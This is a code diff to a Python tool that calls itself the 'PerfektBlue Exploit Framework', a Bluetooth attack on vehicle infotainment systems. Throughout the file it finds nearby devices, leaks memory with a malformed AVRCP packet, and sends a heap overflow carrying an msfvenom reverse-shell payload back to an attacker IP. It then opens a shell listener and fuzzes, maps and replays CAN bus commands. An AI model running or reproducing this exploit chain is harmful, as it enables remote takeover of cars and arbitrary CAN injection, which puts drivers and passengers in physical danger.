@@ -9,6 +9,8 @@ import os
 import platform
 import subprocess
 import json
+import re
+import ast
 
 # === CONFIGURATION ===
 DEFAULT_RFCOMM_PORT = 3
@@ -17,6 +19,15 @@ AVRCP_MALFORMED_CMD = b'\x10\x47' + b'\xFF' * 10
 REVERSE_SHELL_PORT = 4444
 ARCHITECTURES = ["armle", "aarch64", "x86", "x64", "mipsel"]
 CAN_DB_PATH = "can_command_db.json"
+
+class Colors:
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    ORANGE = '\033[38;5;214m'
+    RED = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
 
 # === UTILS ===
 def get_local_ip():
@@ -30,108 +41,215 @@ def get_local_ip():
         s.close()
 
 def prompt_external_ip():
-    print("[*] IMPORTANT: Reverse shell requires an IP the target can reach.")
-    print("[*] For vehicles not connected to Internet, you must use Bluetooth-to-TCP or physical backchannel.")
-    ip = input("Enter attacker IP for reverse shell listener (or press ENTER to auto-detect): ").strip()
+    print(f"{Colors.YELLOW}[*] IMPORTANT: Reverse shell requires an IP the target can reach.{Colors.ENDC}")
+    print(f"{Colors.YELLOW}[*] For vehicles not connected to Internet, you must use Bluetooth-to-TCP or physical backchannel.{Colors.ENDC}")
+    ip = input(f"{Colors.BLUE}Enter attacker IP for reverse shell listener (or press ENTER to auto-detect): {Colors.ENDC}").strip()
     return ip if ip else get_local_ip()
 
-def discover_bluetooth_devices():
-    print("[*] Searching for nearby Bluetooth devices...")
+def select_and_configure_adapter():
+    """
+    Lists available Bluetooth adapters using hciconfig, allows the user to select one,
+    and turns it on if it's down. Returns the numeric device ID.
+    """
+    print(f"{Colors.BLUE}[*] Checking for Bluetooth adapters...{Colors.ENDC}")
     try:
-        nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=False)
+        result = subprocess.run(["hciconfig"], capture_output=True, text=True, check=False)
+        if "command not found" in result.stderr.lower():
+            print(f"{Colors.RED}[!] ERROR: 'hciconfig' command not found.{Colors.ENDC}")
+            print(f"{Colors.YELLOW}    Please install bluez tools (e.g., 'sudo apt install bluez-hciconfig') or ensure it's in your PATH.{Colors.ENDC}")
+            return None
+        if result.returncode != 0 and not result.stdout:
+             print(f"{Colors.RED}[!] 'hciconfig' command failed. Is bluez installed and are you a member of the 'bluetooth' group?{Colors.ENDC}")
+             print(f"{Colors.RED}[!] Stderr: {result.stderr}{Colors.ENDC}")
+             return None
+
+        adapter_names = re.findall(r"^(\w+):", result.stdout, re.MULTILINE)
+        if not adapter_names:
+            print(f"{Colors.RED}[!] No Bluetooth adapters found by hciconfig.{Colors.ENDC}")
+            return None
+
+        adapters = []
+        for name in adapter_names:
+            adapter_info = subprocess.run(["hciconfig", name], capture_output=True, text=True)
+            status = "UP" if "UP RUNNING" in adapter_info.stdout else "DOWN"
+            adapters.append((name, status))
+
+        print(f"{Colors.GREEN}[+] Available adapters:{Colors.ENDC}")
+        for i, (name, status) in enumerate(adapters):
+            print(f"  [{i}] {name} ({status})")
+
+        selected_adapter_name = None
+        if len(adapters) > 1:
+            while True:
+                try:
+                    choice = input(f"{Colors.BLUE}Select an adapter to use: {Colors.ENDC}").strip()
+                    if choice.isdigit() and 0 <= int(choice) < len(adapters):
+                        selected_adapter_name = adapters[int(choice)][0]
+                        break
+                    else:
+                        print(f"{Colors.RED}[!] Invalid choice.{Colors.ENDC}")
+                except (ValueError, IndexError):
+                    print(f"{Colors.RED}[!] Invalid input.{Colors.ENDC}")
+        elif adapters:
+            selected_adapter_name = adapters[0][0]
+            print(f"{Colors.BLUE}[*] Automatically selecting adapter: {selected_adapter_name}{Colors.ENDC}")
+        else:
+             return None
+
+        selected_adapter_info = next((item for item in adapters if item[0] == selected_adapter_name), None)
+        if selected_adapter_info and selected_adapter_info[1] == "DOWN":
+            power_on = input(f"{Colors.YELLOW}[?] Adapter {selected_adapter_name} is down. Turn it on? (y/n): {Colors.ENDC}").strip().lower()
+            if power_on == 'y':
+                print(f"{Colors.BLUE}[*] Powering on {selected_adapter_name}...{Colors.ENDC}")
+                power_on_result = subprocess.run(["hciconfig", selected_adapter_name, "up"], capture_output=True, text=True)
+                if power_on_result.returncode != 0:
+                    if "rf-kill" in power_on_result.stderr.lower():
+                        print(f"{Colors.RED}[!] Failed to power on {selected_adapter_name} due to RF-kill.{Colors.ENDC}")
+                        print(f"{Colors.YELLOW}    Your Bluetooth adapter is blocked. You can try to unblock it with 'sudo rfkill unblock bluetooth'.{Colors.ENDC}")
+                    else:
+                        print(f"{Colors.RED}[!] Failed to power on {selected_adapter_name}.{Colors.ENDC}")
+                        print(f"{Colors.RED}[!] Stderr: {power_on_result.stderr}{Colors.ENDC}")
+                    return None
+                print(f"{Colors.GREEN}[+] Adapter {selected_adapter_name} is now up.{Colors.ENDC}")
+                time.sleep(1)
+            else:
+                print(f"{Colors.RED}[!] Cannot proceed with the adapter turned off.{Colors.ENDC}")
+                return None
+
+        return int(selected_adapter_name.replace("hci", ""))
+
+    except FileNotFoundError:
+        print(f"{Colors.RED}[!] ERROR: 'hciconfig' not found. Please ensure 'bluez' or 'bluez-hciconfig' is installed and in your PATH.{Colors.ENDC}")
+        return None
+    except Exception as e:
+        print(f"{Colors.RED}[!] An error occurred while managing adapters: {e}{Colors.ENDC}")
+        return None
+
+def discover_bluetooth_devices(adapter_id=None):
+    """Scans for Bluetooth devices using a specific adapter."""
+    print(f"{Colors.BLUE}[*] Searching for nearby Bluetooth devices...{Colors.ENDC}")
+    try:
+        nearby_devices = bluetooth.discover_devices(
+            duration=8,
+            lookup_names=True,
+            flush_cache=True,
+            lookup_class=True,
+            device_id=adapter_id if adapter_id is not None else -1
+        )
+        if not nearby_devices:
+            print(f"{Colors.YELLOW}[!] No Bluetooth devices found. Try increasing the duration or moving closer to the target.{Colors.ENDC}")
+            return None
+
+        print(f"{Colors.GREEN}[+] Found devices:{Colors.ENDC}")
+        for i, (addr, name, class_of_device) in enumerate(nearby_devices):
+            print(f"  [{i}] {name} ({addr}) - Class: {class_of_device:#06x}")
+
+        while True:
+            try:
+                choice = input(f"{Colors.BLUE}Select a device by number (or 'q' to quit): {Colors.ENDC}").strip()
+                if choice.lower() == 'q':
+                    return None
+                if choice.isdigit() and 0 <= int(choice) < len(nearby_devices):
+                    return nearby_devices[int(choice)][0]
+                else:
+                    print(f"{Colors.RED}[!] Invalid choice. Please enter a valid number.{Colors.ENDC}")
+            except ValueError:
+                print(f"{Colors.RED}[!] Invalid input. Please enter a number.{Colors.ENDC}")
+            except Exception as e:
+                print(f"{Colors.RED}[!] Error selecting device: {e}{Colors.ENDC}")
+                return None
     except OSError as e:
         if e.errno == 19:
-            print("[!] ERROR: No Bluetooth adapter found or enabled.")
-            print("    Please ensure your Bluetooth adapter is plugged in and turned on.")
-            return None
+            print(f"{Colors.RED}[!] ERROR: No Bluetooth adapter found or enabled.{Colors.ENDC}")
+            print(f"{Colors.YELLOW}    Please ensure your Bluetooth adapter is plugged in and turned on.{Colors.ENDC}")
         else:
-            raise
-    if not nearby_devices:
-        print("[!] No Bluetooth devices found.")
+            print(f"{Colors.RED}[!] An OS error occurred: {e}{Colors.ENDC}")
         return None
-    print("[+] Found devices:")
-    for i, (addr, name) in enumerate(nearby_devices):
-        print(f"  [{i}] {name} ({addr})")
-    while True:
-        try:
-            choice = input("Select a device by number: ").strip()
-            if choice.isdigit() and 0 <= int(choice) < len(nearby_devices):
-                return nearby_devices[int(choice)][0]
-            else:
-                print("[!] Invalid choice. Please enter a valid number.")
-        except Exception as e:
-            print(f"[!] Error selecting device: {e}")
 
 def run_nmap_fingerprint(target_ip):
-    print(f"[*] Running Nmap OS and service scan on {target_ip}...")
+    print(f"{Colors.BLUE}[*] Running Nmap OS and service scan on {target_ip}...{Colors.ENDC}")
     try:
         result = subprocess.run(["nmap", "-O", "-sV", target_ip], capture_output=True, text=True, timeout=60)
         print(result.stdout)
         return result.stdout
     except Exception as e:
-        print(f"[!] Nmap fingerprinting failed: {e}")
+        print(f"{Colors.RED}[!] Nmap fingerprinting failed: {e}{Colors.ENDC}")
         return None
 
 def run_bluetooth_fingerprint(bt_addr):
-    print(f"[*] Running Bluetooth service scan on {bt_addr}...")
+    print(f"{Colors.BLUE}[*] Running Bluetooth service scan on {bt_addr}...{Colors.ENDC}")
     try:
         services = bluetooth.find_service(address=bt_addr)
         if not services:
-            print("[!] No services found.")
+            print(f"{Colors.YELLOW}[!] No services found.{Colors.ENDC}")
             return None
         for svc in services:
             print(f"  [Service] Name: {svc['name']} | Protocol: {svc['protocol']} | Port: {svc['port']}")
         return services
     except Exception as e:
-        print(f"[!] Bluetooth fingerprinting failed: {e}")
+        print(f"{Colors.RED}[!] Bluetooth fingerprinting failed: {e}{Colors.ENDC}")
         return None
 
 # === STAGE 1: MEMORY LEAK VIA AVRCP ===
 def avrcp_info_leak(target_addr, port):
-    print(f"[*] Sending AVRCP malformed request to {target_addr}:{port}")
+    print(f"{Colors.BLUE}[*] Sending AVRCP malformed request to {target_addr}:{port}{Colors.ENDC}")
     try:
         s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
         s.connect((target_addr, port))
         s.send(AVRCP_MALFORMED_CMD)
         response = s.recv(1024)
         s.close()
-        print(f"[+] Leak Response: {response.hex()}")
+        print(f"{Colors.GREEN}[+] Leak Response: {response.hex()}{Colors.ENDC}")
         if len(response) >= 4:
             leaked_ptr = struct.unpack("<I", response[-4:])[0]
-            print(f"[+] Potential leaked address: 0x{leaked_ptr:X}")
+            print(f"{Colors.GREEN}[+] Potential leaked address: 0x{leaked_ptr:X}{Colors.ENDC}")
             return leaked_ptr
         else:
-            print("[-] Leak failed or too short.")
+            print(f"{Colors.YELLOW}[-] Leak failed or too short.{Colors.ENDC}")
             return None
     except Exception as e:
-        print(f"[!] Leak error: {e}")
+        print(f"{Colors.RED}[!] Leak error: {e}{Colors.ENDC}")
         return None
 
 # === STAGE 2: HEAP OVERFLOW AND SHELLCODE DEPLOYMENT ===
 def generate_reverse_shell_payload(ip, port, arch):
-    print(f"[*] Generating reverse shell payload using msfvenom for arch: {arch}")
+    print(f"{Colors.BLUE}[*] Generating reverse shell payload using msfvenom for arch: {arch}{Colors.ENDC}")
     try:
-        result = subprocess.run([
+        msfvenom_command = [
             "msfvenom",
             "-p", f"linux/{arch}/shell_reverse_tcp",
             f"LHOST={ip}",
             f"LPORT={port}",
-            "-f", "python"
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=300)
+            "-f", "hex"
+        ]
+        print(f"{Colors.BLUE}[*] Running command: {' '.join(msfvenom_command)}{Colors.ENDC}")
+        result = subprocess.run(
+            msfvenom_command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            timeout=300
+        )
+
         if result.returncode != 0:
-            print(f"[!] msfvenom failed: {result.stderr}")
+            print(f"{Colors.RED}[!] msfvenom failed:\n{result.stderr}{Colors.ENDC}")
             return b""
-        lines = result.stdout.splitlines()
-        payload_lines = [line for line in lines if line.startswith("buf")]
-        payload = b""
-        for line in payload_lines:
-            exec(line.strip())
-        return buf
+
+        try:
+            return bytes.fromhex(result.stdout.strip())
+        except ValueError:
+            print(f"{Colors.RED}[!] Could not parse msfvenom hex output.{Colors.ENDC}")
+            print(f"{Colors.YELLOW}[!] Raw output:\n{result.stdout}{Colors.ENDC}")
+            return b""
+
+    except FileNotFoundError:
+        print(f"{Colors.RED}[!] ERROR: 'msfvenom' not found. Please ensure it is installed and in your PATH.{Colors.ENDC}")
+        return b""
     except subprocess.TimeoutExpired:
-        print("[!] msfvenom command timed out after 300 seconds. It might be taking too long to generate the payload.")
+        print(f"{Colors.RED}[!] msfvenom command timed out after 300 seconds.{Colors.ENDC}")
         return b""
     except Exception as e:
-        print(f"[!] Payload generation error: {e}")
+        print(f"{Colors.RED}[!] Payload generation error: {e}{Colors.ENDC}")
         return b""
 
 def overflow_payload(leaked_address=None, shellcode=b""):
@@ -143,24 +261,24 @@ def overflow_payload(leaked_address=None, shellcode=b""):
 
 def send_overflow(target_addr, port, leaked_address=None, shellcode=b""):
     payload = overflow_payload(leaked_address, shellcode)
-    print(f"[*] Sending overflow payload ({len(payload)} bytes)...")
+    print(f"{Colors.BLUE}[*] Sending overflow payload ({len(payload)} bytes)...{Colors.ENDC}")
     try:
         s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
         s.connect((target_addr, port))
         s.send(payload)
         s.close()
-        print("[+] Overflow payload sent.")
+        print(f"{Colors.GREEN}[+] Overflow payload sent.{Colors.ENDC}")
     except Exception as e:
-        print(f"[!] Overflow failed: {e}")
+        print(f"{Colors.RED}[!] Overflow failed: {e}{Colors.ENDC}")
 
 # === STAGE 3: REVERSE SHELL LISTENER ===
 def reverse_shell_listener(listen_port=SHELL_LISTEN_PORT):
-    print(f"[*] Listening for reverse shell on 0.0.0.0:{listen_port}")
+    print(f"{Colors.BLUE}[*] Listening for reverse shell on 0.0.0.0:{listen_port}{Colors.ENDC}")
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(('0.0.0.0', listen_port))
     server.listen(1)
     conn, addr = server.accept()
-    print(f"[+] Reverse shell connected from {addr}")
+    print(f"{Colors.GREEN}[+] Reverse shell connected from {addr}{Colors.ENDC}")
     try:
         while True:
             cmd = input("$ ")
@@ -170,7 +288,7 @@ def reverse_shell_listener(listen_port=SHELL_LISTEN_PORT):
             response = conn.recv(4096)
             print(response.decode())
     except KeyboardInterrupt:
-        print("\n[*] Shell session terminated.")
+        print(f"\n{Colors.YELLOW}[*] Shell session terminated.{Colors.ENDC}")
     finally:
         conn.close()
         server.close()
@@ -187,19 +305,19 @@ def save_can_db(db):
         json.dump(db, f, indent=2)
 
 def fuzz_can(interface='can0'):
-    print(f"[*] Starting CAN fuzzing on interface {interface}...")
+    print(f"{Colors.BLUE}[*] Starting CAN fuzzing on interface {interface}...{Colors.ENDC}")
     bus = can.interface.Bus(channel=interface, bustype='socketcan')
     for i in range(50):
         can_id = random.randint(0x100, 0x7FF)
         data_len = random.randint(1, 8)
         data = bytearray(random.getrandbits(8) for _ in range(data_len))
         msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
-        print(f"[*] Sending ID: 0x{can_id:X}, Data: {data.hex()}")
+        print(f"{Colors.BLUE}[*] Sending ID: 0x{can_id:X}, Data: {data.hex()}{Colors.ENDC}")
         bus.send(msg)
         time.sleep(0.1)
 
 def map_can_commands(interface='can0', duration=10):
-    print(f"[*] Mapping CAN commands on {interface} for {duration} seconds...")
+    print(f"{Colors.BLUE}[*] Mapping CAN commands on {interface} for {duration} seconds...{Colors.ENDC}")
     bus = can.interface.Bus(channel=interface, bustype='socketcan')
     start = time.time()
     seen = load_can_db()
@@ -209,67 +327,101 @@ def map_can_commands(interface='can0', duration=10):
             cmd = f"0x{msg.arbitration_id:X}"
             if cmd not in seen:
                 seen[cmd] = list(msg.data)
-                print(f"[+] Mapped CMD {cmd} => {msg.data.hex()}")
+                print(f"{Colors.GREEN}[+] Mapped CMD {cmd} => {msg.data.hex()}{Colors.ENDC}")
     save_can_db(seen)
     return seen
 
 def replay_can_command(interface='can0', cmd_map=None):
     if not cmd_map:
-        print("[!] No CAN commands mapped.")
+        print(f"{Colors.YELLOW}[!] No CAN commands mapped.{Colors.ENDC}")
         return
     bus = can.interface.Bus(channel=interface, bustype='socketcan')
     for cmd, data in cmd_map.items():
         msg = can.Message(arbitration_id=int(cmd, 16), data=bytearray(data), is_extended_id=False)
-        print(f"[*] Replaying CMD {cmd} => {bytearray(data).hex()}")
+        print(f"{Colors.BLUE}[*] Replaying CMD {cmd} => {bytearray(data).hex()}{Colors.ENDC}")
         bus.send(msg)
         time.sleep(0.1)
 
 # === MAIN ===
-def main():
-    print("=== PerfektBlue Exploit Framework ===")
-    target = discover_bluetooth_devices()
-    if not target:
-        print("[!] No target selected. Exiting...")
-        time.sleep(3)
-        return
-    port = DEFAULT_RFCOMM_PORT
-    attacker_ip = prompt_external_ip()
-
+def run_fingerprinting(target):
+    """Runs Bluetooth and optional Nmap fingerprinting."""
     try:
         run_bluetooth_fingerprint(target)
-        ip_guess = input("Target IP address (for Nmap scan, or ENTER to skip): ").strip()
+        ip_guess = input(f"{Colors.BLUE}Target IP address (for Nmap scan, or ENTER to skip): {Colors.ENDC}").strip()
         if ip_guess:
             run_nmap_fingerprint(ip_guess)
     except Exception as e:
-        print(f"[!] Fingerprinting failed: {e}")
+        print(f"{Colors.RED}[!] Fingerprinting failed: {e}{Colors.ENDC}")
 
-    print("[*] Select target architecture (based on fingerprinting):")
+def select_architecture():
+    """Prompts the user to select the target architecture."""
+    print(f"{Colors.BLUE}[*] Select target architecture (based on fingerprinting):{Colors.ENDC}")
     for i, arch in enumerate(ARCHITECTURES):
         print(f"  [{i}] {arch}")
-    arch_choice = input("Choose architecture index or press ENTER for default [0]: ").strip()
-    arch = ARCHITECTURES[int(arch_choice)] if arch_choice.isdigit() else ARCHITECTURES[0]
+    while True:
+        arch_choice = input(f"{Colors.BLUE}Choose architecture index or press ENTER for default [0]: {Colors.ENDC}").strip()
+        if not arch_choice:
+            return ARCHITECTURES[0]
+        if arch_choice.isdigit() and 0 <= int(arch_choice) < len(ARCHITECTURES):
+            return ARCHITECTURES[int(arch_choice)]
+        print(f"{Colors.RED}[!] Invalid choice.{Colors.ENDC}")
 
+def perform_attack(target, port, attacker_ip, arch):
+    """Generates payload, performs the attack, and listens for a shell."""
     shellcode = generate_reverse_shell_payload(attacker_ip, REVERSE_SHELL_PORT, arch)
     if not shellcode:
-        print("[!] No shellcode generated. Aborting.")
+        print(f"{Colors.RED}[!] No shellcode generated. Aborting.{Colors.ENDC}")
         return
 
     leaked = avrcp_info_leak(target, port)
     time.sleep(1)
     send_overflow(target, port, leaked, shellcode)
 
-    launch_shell = input("[?] Wait for reverse shell? (y/n): ").strip().lower()
+    launch_shell = input(f"{Colors.YELLOW}[?] Wait for reverse shell? (y/n): {Colors.ENDC}").strip().lower()
     if launch_shell == 'y':
         reverse_shell_listener()
 
-    do_can = input("[?] Run CAN fuzzing/mapping? (y/n): ").strip().lower()
+def run_can_operations():
+    """Handles CAN bus fuzzing and mapping."""
+    do_can = input(f"{Colors.YELLOW}[?] Run CAN fuzzing/mapping? (y/n): {Colors.ENDC}").strip().lower()
     if do_can == 'y':
-        iface = input("CAN interface name (default 'can0'): ").strip() or 'can0'
+        iface = input(f"{Colors.BLUE}CAN interface name (default 'can0'): {Colors.ENDC}").strip() or 'can0'
         fuzz_can(iface)
         cmd_map = map_can_commands(iface)
-        replay = input("[?] Replay mapped CAN commands? (y/n): ").strip().lower()
+        replay = input(f"{Colors.YELLOW}[?] Replay mapped CAN commands? (y/n): {Colors.ENDC}").strip().lower()
         if replay == 'y':
             replay_can_command(iface, cmd_map)
+
+def main():
+	print(fr"""{Colors.BLUE}
+	______          __     _    _  ______ _
+	| ___ \        / _|   | |  | | | ___ \ |
+	| |_/ /__ _ __| |_ ___| | _| |_| |_/ / |_   _  ___
+	|  __/ _ \ '__|  _/ _ \ |/ / __| ___ \ | | | |/ _ \
+	| | |  __/ |  | ||  __/   <| |_| |_/ / | |_| |  __/
+	\_|  \___|_|  |_| \___|_|\_\\__\____/|_|\__,_|\___|
+
+		=== PerfektBlue Exploit Framework ===	{Colors.ORANGE} 
+                         <--- by nour833 --->
+
+	{Colors.ENDC}""")
+	try:
+		adapter_id = select_and_configure_adapter()
+		if adapter_id is None:
+			print(f"{Colors.RED}[!] No usable Bluetooth adapter selected. Exiting...{Colors.ENDC}")
+			return
+		target = discover_bluetooth_devices(adapter_id=adapter_id)
+		if not target:
+			print(f"{Colors.RED}[!] No target selected. Exiting...{Colors.ENDC}")
+			return
+		port = DEFAULT_RFCOMM_PORT
+		attacker_ip = prompt_external_ip()
+		run_fingerprinting(target)
+		arch = select_architecture()
+		perform_attack(target, port, attacker_ip, arch)
+		run_can_operations()
+	except KeyboardInterrupt:
+		print(f"\n{Colors.YELLOW}[*] User interrupted. Exiting gracefully...{Colors.ENDC}")
 
 if __name__ == "__main__":
     main()
